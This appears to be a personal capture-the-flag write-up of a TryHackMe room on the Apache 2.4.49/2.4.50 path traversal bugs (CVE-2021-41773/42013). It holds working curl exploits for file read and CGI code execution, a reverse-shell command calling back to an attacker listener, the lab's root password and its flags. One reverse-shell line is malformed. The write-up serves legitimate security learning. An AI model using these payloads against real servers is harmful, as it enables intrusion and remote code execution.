https://tryhackme.com/r/room/cve202141773

#apache #PathTraversal 

```
2.4.49

This vulnerability requires an unusual misconfiguration for it to be exploitable = yea

```

## Path Traversal 

A Path Traversal exploit is an attack that aims to access resources that are normally inaccessible by abusing flaws in path resolution and/or normalization. We'd usually exploit this type of attack by traveling (also known as traversing) backwards beyond the supposed root using the `..` syntax.

### Apache 

A recent change in the path normalization module in the Apache server then allowed a specially crafted URL to bypass the filters and traverse beyond the document root, allowing arbitrary file read on the system if the configuration allowed it. Furthermore, if the CGI module was enabled, then arbitrary file execution is also possible!

```

A path traversal exploit will = allow arbitrary files to be exposed by the server

url-encoded `.` symbol = %2E

%%32%65 = %2e

What module needs to be enabled in order to get remote code execution?
mod_cgi
```

```
# Apache 2.4.49 without CGI:
curl -v 'http://10.10.17.14:8080//cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd'

curl -v 'http://10.10.17.14:8080//cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/flag.txt'  

# Apache 2.4.49 with CGI: `http://10.10.17.14:8081`
curl -v 'http://10.10.17.14:8081/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; cat /flag.txt' -H "Content-Type: text/plain"

THM{2C3_F20M_C61} 

# - Apache 2.4.50 without CGI: `http://10.10.17.14:8082`
curl 'http://10.10.17.14:8082/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/flag.txt'

THM{D0UBL3_3NC0D1N6_F7W} 

# - Apache 2.4.50 with CGI: `http://10.10.17.14:8083`
curl 'http://10.10.17.14:8083/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash' -d 'echo Content-Type: text/plain; echo;cat /flag.txt' -H "Content-Type: text/plain"

THM{F1L732_8YP455_2C3}

terminal: nc -lvnp 4444
bash -i >& /dev/tcp/<target_machine_ip>/http://10.10.17.14:8083> 0>&1

curl -v 'http://10.10.17.14:8083/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash' -d 'echo Content-Type: text/plain; echo; sh -i >& /dev/tcp/10.13.77.248/4444 0>&1 ' -H "Content-Type: text/plain"

whoami
daemon

pwd
/bin
cd ..
ls
cat root.txt

THM{F1L732_8YP455_2C3}     not flag

su root
ApacheCVE
ls
find / -name root.txt
cat/root/root.txt

THM{P21V_35C_F20M_4P4CH3_15_FUN}

```

```
https://github.com/jesusgavancho/TryHackMe_and_HackTheBox/blob/master/CVE-2021-41773.md

https://vineethbharadwaj.medium.com/cve-2021-41773-42013-thm-write-up-task-4-8af1832236a5

```

